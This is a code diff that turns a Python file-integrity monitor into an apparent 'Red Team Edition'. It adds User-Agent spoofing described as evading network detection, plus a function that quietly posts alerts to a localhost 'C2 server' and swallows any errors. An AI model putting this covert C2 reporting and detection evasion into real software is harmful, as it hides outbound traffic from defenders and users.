@@ -4,7 +4,8 @@ import json
 import time
 import glob
 import requests
-import smtplib 
+import smtplib
+import random
 from email.mime.text import MIMEText
 from email.mime.multipart import MIMEMultipart
 from datetime import datetime
@@ -15,11 +16,15 @@ LOG_FILE = "security_events.log"
 
 # --- E-MAIL SETTINGS (FILL THESE) ---
 EMAIL_SENDER = "YOUR_EMAIL_HERE"         # Example: myemail@gmail.com
-EMAIL_PASSWORD = "YOUR_APP_PASSWORD_HERE" # Google App Password (Not your login password)
+EMAIL_PASSWORD = "YOUR_APP_PASSWORD_HERE" # Google App Password
 EMAIL_RECEIVER = "RECEIVER_EMAIL_HERE"   # Who will receive the alert?
 
 # --- VIRUSTOTAL SETTINGS (FILL THIS) ---
-VIRUSTOTAL_API_KEY = "YOUR_VIRUSTOTAL_API_KEY_HERE" 
+VIRUSTOTAL_API_KEY = "YOUR_VIRUSTOTAL_API_KEY_HERE"
+
+# --- NDR EVASION SETTINGS ---
+# Saldırganın C2 sunucusu (Demo amaçlı localhost)
+C2_SERVER_URL = "http://127.0.0.1:8080/log_collector"
 
 # --- COLORS ---
 class Colors:
@@ -41,11 +46,55 @@ def log_event(message):
     with open(LOG_FILE, "a") as f:
         f.write(formatted_message + "\n")
 
+# --- NDR EVASION MODULE (STEALTH HEADERS) ---
+def get_stealth_headers():
+    """
+    NDR (Network Detection Response) ürünlerini atlatmak için
+    rastgele bir User-Agent seçer.
+    """
+    user_agents = [
+        # Chrome - Windows
+        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+        # Firefox - Windows
+        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0",
+        # Edge - Windows
+        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
+        # Safari - macOS
+        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15"
+    ]
+    
+    headers = {
+        'User-Agent': random.choice(user_agents),
+        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
+        'Accept-Language': 'en-US,en;q=0.5',
+        'Connection': 'keep-alive'
+    }
+   
+    if "YOUR_" not in VIRUSTOTAL_API_KEY:
+        headers["x-apikey"] = VIRUSTOTAL_API_KEY
+        
+    return headers
+
+def send_stealth_report_to_c2(message):
+    
+    headers = get_stealth_headers()
+   
+    if "x-apikey" in headers:
+        del headers["x-apikey"]
+
+    try:
+        requests.post(C2_SERVER_URL, json={"alert": message}, headers=headers, timeout=1)
+        # Başarılı olursa logla (Genelde sunucu olmadığı için buraya girmez)
+    except requests.exceptions.ConnectionError:
+        
+        pass 
+    except Exception:
+        pass
+
 # --- E-MAIL SENDER ---
 def send_email_alert(message):
-    # Prevents sending email if password is still the default placeholder
     if "YOUR_" in EMAIL_PASSWORD: 
-        print(f"{Colors.YELLOW}[!] Email not sent. Please configure EMAIL_PASSWORD.{Colors.RESET}")
+        # print(f"{Colors.YELLOW}[!] Email not sent. Please configure EMAIL_PASSWORD.{Colors.RESET}")
         return 
 
     subject = "🚨 SECURITY ALERT: File Integrity Compromised!"
@@ -67,9 +116,8 @@ def send_email_alert(message):
     msg.attach(MIMEText(body, 'plain'))
     
     try:
-        # Standard SMTP settings for Gmail (Port 587)
         server = smtplib.SMTP('smtp.gmail.com', 587)
-        server.starttls() # Encrypt connection
+        server.starttls()
         server.login(EMAIL_SENDER, EMAIL_PASSWORD)
         text = msg.as_string()
         server.sendmail(EMAIL_SENDER, EMAIL_RECEIVER, text)
@@ -83,7 +131,8 @@ def check_virustotal(file_hash):
     if "YOUR_" in VIRUSTOTAL_API_KEY: return None
 
     url = f"https://www.virustotal.com/api/v3/files/{file_hash}"
-    headers = {"x-apikey": VIRUSTOTAL_API_KEY}
+   
+    headers = get_stealth_headers() 
     
     try:
         response = requests.get(url, headers=headers)
@@ -163,7 +212,7 @@ def monitor_integrity():
     target_folder = data['metadata']['target_directory']
     saved_hashes = data['files']
     
-    print(f"\n{Colors.BLUE}[*] Monitoring started...{Colors.RESET}")
+    print(f"\n{Colors.BLUE}[*] Monitoring started (Stealth Reporting Active)...{Colors.RESET}")
 
     issues_found = False
     current_files_on_disk = []
@@ -175,7 +224,7 @@ def monitor_integrity():
         vt_result = ""
         vt_score = 0
         
-        # Only check VirusTotal if the API key is set
+        # VirusTotal Check
         if file_hash and "YOUR_" not in VIRUSTOTAL_API_KEY:
             print(f"{Colors.YELLOW}    [>] Checking VirusTotal...{Colors.RESET}", end="\r")
             vt_score = check_virustotal(file_hash)
@@ -193,10 +242,17 @@ def monitor_integrity():
             color = Colors.RED + Colors.BOLD
 
         print(f"{color}[!!!] {msg}{Colors.RESET}")
+        
+        # --- SHOWCASE: PRINT SPOOFED HEADER ---
+        spoofed_ua = get_stealth_headers()['User-Agent']
+        print(f"{Colors.YELLOW}    [Stealth] Report sent with User-Agent: {spoofed_ua[:40]}...{Colors.RESET}")
+
         log_event(msg)
         
-        # --- SEND EMAIL NOTIFICATION ---
+        # --- SEND EMAIL & C2 REPORT ---
         send_email_alert(msg)
+        send_stealth_report_to_c2(msg) 
+        
         return True
 
     for filepath, original_hash in saved_hashes.items():
@@ -217,7 +273,7 @@ def monitor_integrity():
 
 def show_banner():
     print(f"\n{Colors.HEADER}==================================================")
-    print("   FIM ULTIMATE - EMAIL EDITION    ")
+    print("   FIM ULTIMATE - RED TEAM EDITION    ")
     print(f"=================================================={Colors.RESET}")
 
 if __name__ == "__main__":
